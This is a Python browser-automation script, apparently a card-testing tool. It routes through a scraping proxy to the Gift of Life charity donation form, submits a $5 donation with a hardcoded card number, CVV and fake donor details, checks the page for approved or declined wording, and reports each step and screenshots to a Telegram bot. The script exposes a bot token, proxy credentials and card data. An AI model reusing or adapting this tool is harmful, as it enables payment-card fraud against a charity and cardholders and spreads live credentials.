#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v5 — fixed selectors + 5$
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"


# كل الـ IDs فيها نقطتين. لازم نلفها بـ [id='...']
P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"

def sid(name):
    """يبني selector آمن للـ id اللي فيه :"""
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def fill(frame, selector, value, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=10000)
        el.click(timeout=3000)
        el.fill("", timeout=3000)
        el.type(str(value), delay=50)
        # trigger events
        el.evaluate("el => { el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); el.dispatchEvent(new Event('blur',{bubbles:true})); }")
        tg_msg(f"✅ {label or selector}: filled")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def select_option(frame, selector, value, label="", by_label=False):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="attached", timeout=10000)
        if by_label:
            el.select_option(label=str(value), timeout=5000)
        else:
            el.select_option(value=str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('change',{bubbles:true}))")
        tg_msg(f"✅ {label or selector}: selected")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def click(frame, selector, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=10000)
        el.click(timeout=5000)
        tg_msg(f"✅ {label or selector}: clicked")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def run():
    tg_msg("🚀 Gift of Life Donation v5 — Start")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # 1. فتح الصفحة
    tg_msg("🔄 [1] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(15)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    # 2. ابحث عن iframe
    tg_msg("🔄 [2] Waiting for donation iframe...")
    frame = None
    for attempt in range(20):
        for f in page.frames:
            try:
                u = f.url or ""
                if "donate-now" in u and "Arreva" in u:
                    frame = f
                    break
            except Exception:
                continue
        if frame:
            break
        time.sleep(2)

    if not frame:
        tg_msg("❌ Donation iframe not found")
        return
    tg_msg(f"✅ Found iframe")

    time.sleep(6)

    # 3. اختار Other
    tg_msg("🔄 [3] Selecting 'Other' amount = $5...")
    click(frame, sid("rb_amount:4"), "Other radio")
    time.sleep(2)

    # املأ المبلغ. الحقل اسمه other_amount
    other_sel = '[id*="other_amount"]'
    amount_filled = False
    try:
        el = frame.locator(other_sel).first
        if el.count() > 0:
            el.wait_for(state="visible", timeout=5000)
            el.fill("", timeout=3000)
            el.type(DONATION_AMOUNT, delay=60)
            el.evaluate("el => { el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); }")
            tg_msg(f"✅ Amount filled: {DONATION_AMOUNT}")
            amount_filled = True
    except Exception as e:
        tg_msg(f"⚠️ Amount fill: {str(e)[:150]}")

    if not amount_filled:
        # جرّب JS
        try:
            frame.evaluate("""(amt) => {
                const el = document.querySelector('input[id*="other_amount"]');
                if (el) {
                    el.value = amt;
                    el.dispatchEvent(new Event('input',{bubbles:true}));
                    el.dispatchEvent(new Event('change',{bubbles:true}));
                    el.dispatchEvent(new Event('blur',{bubbles:true}));
                }
            }""", DONATION_AMOUNT)
            tg_msg("✅ Amount via JS")
        except Exception as e:
            tg_msg(f"❌ Amount JS: {str(e)[:150]}")

    # 4. املأ بيانات المتبرع
    tg_msg("🔄 [4] Filling donor info...")
    time.sleep(2)

    fill(frame, sid("datafirst"), FIRST_NAME, "First name")
    fill(frame, sid("datalast"), LAST_NAME, "Last name")
    fill(frame, sid("email"), EMAIL, "Email")
    fill(frame, sid("data_phone"), PHONE, "Phone")
    fill(frame, sid("data_address_one"), ADDRESS_1, "Address")
    fill(frame, sid("data_address_city"), CITY, "City")
    fill(frame, sid("data_address_zip"), ZIP, "Zip")

    # Country: دوّر على United States
    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                if (o.text.trim().toLowerCase() === 'united states') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option(frame, sid("data_Rcountry"), us_value, f"Country (US={us_value})")
        else:
            tg_msg("⚠️ United States not in country list")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    # State - California
    select_option(frame, sid("data_Rstate"), STATE_VALUE, "State (CA)")

    # 5. املأ بيانات البطاقة
    tg_msg("🔄 [5] Filling card info...")
    time.sleep(1)

    fill(frame, sid("nameOnCard"), CARD_NAME, "Card name")
    fill(frame, sid("cardNumber"), CARD_NUMBER, "Card number")
    fill(frame, sid("cardCSV"), CARD_CVV, "CVV")

    select_option(frame, sid("cardType"), CARD_TYPE, "Card type")
    select_option(frame, sid("expiration_date_month"), CARD_MONTH, "Exp month")
    select_option(frame, sid("expiration_date_year"), CARD_YEAR, "Exp year")

    # 6. Screenshot
    try:
        page.screenshot(path="/tmp/before_submit.png", full_page=True)
        tg_photo("/tmp/before_submit.png", "📸 Before submit")
    except Exception:
        pass

    # 7. reCAPTCHA
    tg_msg("🔄 [7] Checking reCAPTCHA...")
    time.sleep(3)
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 reCAPTCHA token len = {len(token) if token else 0}")
    except Exception:
        pass

    # 8. Pre-submit state
    tg_msg("🔄 [8] Verifying...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{
                const el = document.getElementById('{P}' + n);
                return el ? el.value : null;
            }};
            return {{
                first: g('datafirst'),
                last: g('datalast'),
                email: g('email'),
                phone: g('data_phone'),
                addr: g('data_address_one'),
                city: g('data_address_city'),
                zip: g('data_address_zip'),
                card_name: g('nameOnCard'),
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
                amount_total: g('label_total_amount'),
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    # 9. Submit
    tg_msg("🔄 [9] Clicking Submit...")
    submit_ok = click(frame, sid("j_idt1913"), "Submit")

    if not submit_ok:
        try:
            frame.evaluate(f"""() => {{
                const btn = document.getElementById('{P}j_idt1913');
                if (btn) btn.click();
            }}""")
            tg_msg("✅ JS click sent")
        except Exception as e:
            tg_msg(f"❌ JS click: {str(e)[:150]}")

    time.sleep(10)

    # 10. النتيجة
    tg_msg("🔄 [10] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        result_lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification"]):
                result_lines.append(l)
        if result_lines:
            tg_msg("📊 Result:\n" + "\n".join(result_lines[:25]))
        else:
            tg_msg("⚠️ No result keywords. iframe preview:\n<pre>"
                   + iframe_text[:1500] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Read: {str(e)[:150]}")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
